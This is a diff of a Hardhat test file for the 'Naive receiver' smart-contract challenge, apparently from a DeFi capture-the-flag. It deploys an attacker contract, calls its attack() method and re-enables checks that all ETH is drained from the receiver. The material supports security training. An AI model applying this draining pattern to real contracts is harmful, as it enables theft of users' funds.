@@ -31,17 +31,17 @@ describe("[Challenge] Naive receiver", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE */
-    const HackReceiverFactory = await ethers.getContractFactory("HackReceiver", attacker);
-    this.hackReceiver = await HackReceiverFactory.deploy(this.pool.address, this.receiver.address);
+    const ReceiverAttackerFactory = await ethers.getContractFactory("ReceiverAttacker", attacker);
+    this.receiverAttacker = await ReceiverAttackerFactory.deploy(this.pool.address, this.receiver.address);
 
-    await this.pool.flashLoan(this.hackReceiver.address, ethers.utils.parseEther("1"));
+    await this.receiverAttacker.attack();
   });
 
-  //   after(async function () {
-  //     /** SUCCESS CONDITIONS */
+  after(async function () {
+    /** SUCCESS CONDITIONS */
 
-  //     // All ETH has been drained from the receiver
-  //     expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal("0");
-  //     expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
-  //   });
+    // All ETH has been drained from the receiver
+    expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal("0");
+    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
+  });
 });
